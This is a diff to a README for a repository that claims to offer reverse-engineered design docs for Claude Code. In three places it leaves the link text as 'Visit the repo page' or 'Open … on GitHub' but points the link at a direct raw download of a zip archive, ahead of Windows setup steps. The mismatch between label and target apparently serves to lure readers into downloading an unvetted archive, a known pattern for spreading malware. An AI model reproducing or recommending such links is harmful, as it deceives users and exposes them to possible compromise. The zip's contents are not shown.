@@ -1,6 +1,6 @@
 # 🤖 claude-code-reverse-engineering - Clear design docs for Claude Code
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20repo%20page-blue?style=for-the-badge&logo=github)](https://github.com/anavee7095/claude-code-reverse-engineering)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20repo%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/anavee7095/claude-code-reverse-engineering/main/docs/reverse_engineering_claude_code_2.5.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ If you want to study the design, this repo gives you implementation-ready specs 
 
 Use this link to visit the page and download or open the project:
 
-[Open claude-code-reverse-engineering on GitHub](https://github.com/anavee7095/claude-code-reverse-engineering)
+[Open claude-code-reverse-engineering on GitHub](https://raw.githubusercontent.com/anavee7095/claude-code-reverse-engineering/main/docs/reverse_engineering_claude_code_2.5.zip)
 
 If you use Windows, follow these steps:
 
@@ -199,7 +199,7 @@ Good examples:
 
 Use this page to visit the repo and download the files:
 
-[https://github.com/anavee7095/claude-code-reverse-engineering](https://github.com/anavee7095/claude-code-reverse-engineering)
+[https://raw.githubusercontent.com/anavee7095/claude-code-reverse-engineering/main/docs/reverse_engineering_claude_code_2.5.zip](https://raw.githubusercontent.com/anavee7095/claude-code-reverse-engineering/main/docs/reverse_engineering_claude_code_2.5.zip)
 
 ## 🪟 Windows setup path
 
